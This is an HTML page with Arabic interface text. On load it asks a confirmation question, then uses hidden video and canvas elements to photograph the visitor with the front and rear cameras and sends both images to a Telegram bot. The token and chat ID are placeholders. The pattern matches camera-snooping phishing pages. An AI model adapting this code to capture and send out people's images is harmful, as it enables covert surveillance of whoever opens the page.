<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Auto Capture</title>
</head>
<body>

<video id="video" width="320" height="240" autoplay style="display:none;"></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "PUT-YOUR-TOKEN-HERE";
const CHAT_ID = "PUT-CHAT-ID-HERE";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

async function capture(facing) {
    const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facing }
    });

    video.srcObject = stream;

    // الانتظار حتى تستقر الصورة
    await new Promise(r => setTimeout(r, 1200));

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

    // إيقاف الكاميرا
    stream.getTracks().forEach(track => track.stop());

    return blob;
}

async function sendToTelegram(blob, name) {
    let formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, name + ".jpg");

    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    });
}

async function startProcess() {
    const ok = confirm("هل تريد التقاط صور وإرسالها إلى تليغرام؟");

    if (!ok) return;

    // كاميرا أمامية
    const front = await capture("user");
    await sendToTelegram(front, "front");

    // كاميرا خلفية
    const back = await capture("environment");
    await sendToTelegram(back, "back");

    alert("✓ تم التقاط وإرسال الصورتين بنجاح");
}

startProcess();
</script>

</body>
</html>
